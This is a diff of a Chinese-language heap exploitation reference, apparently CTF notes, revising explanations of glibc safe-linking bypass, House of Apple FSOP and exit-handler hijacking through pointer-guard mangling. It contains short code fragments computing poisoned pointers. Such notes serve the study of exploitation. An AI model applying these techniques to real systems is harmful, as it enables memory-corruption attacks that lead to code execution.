@@ -25,8 +25,8 @@ glibc 2.32 起 tcache/fastbin 的 fd 经 `(pos >> 12) ^ ptr` 异或保护（pos 
 
 ### 方法 1：泄漏堆地址（最可靠）
 ```python
-# 从 unsorted bin fd/bk 泄漏堆地址（unsorted bin 未加 safe-linking）
-heap_addr = leaked_unsorted_fd
+# 泄漏堆地址（从堆指针：unsorted bin 中多 chunk 的 fd/bk、或 UAF 读相邻 free chunk 的指针）
+heap_addr = leaked_heap_ptr
 key = heap_addr >> 12  # safe-linking key
 poisoned_fd = key ^ target_addr  # 构造毒化 fd
 ```
@@ -72,7 +72,7 @@ real_addr = encrypted_fd ^ (chunk_addr >> 12)
 
 > `__malloc_hook`/`__free_hook` 在 2.34 被移除后，以下落点替代。
 
-### 落点 A：House of Apple 2（IO_FILE wide-data vtable）
+### 落点 A：House of Apple（IO_FILE wide-data vtable）
 **场景**: glibc 2.35-2.39，有任意写 + 能触发 FSOP（exit / _IO_flush_all_lockp）
 
 ```
@@ -95,7 +95,7 @@ real_addr = encrypted_fd ^ (chunk_addr >> 12)
   1. 泄漏 pointer guard（位于 TLS，glibc 2.34+ 偏移固定）
      pwndbg: p/x $fs_base  →  找 pointer guard 偏移
   2. 用 PTR_MANGLE 规则计算目标值:
-     mangled = rol((ptr ^ pointer_guard), 17)  # 左旋 17 位后异或
+     mangled = rol((ptr ^ pointer_guard), 17)  # 先异或 pointer_guard，再左旋 17 位
      pwntools: from pwn import *; rol(target ^ key, 17, 64)
   3. 任意写覆盖 __exit_funcs->next 或 initial 的 fn 指针
   4. 触发 exit → 遍历 atexit handler → 执行伪造函数
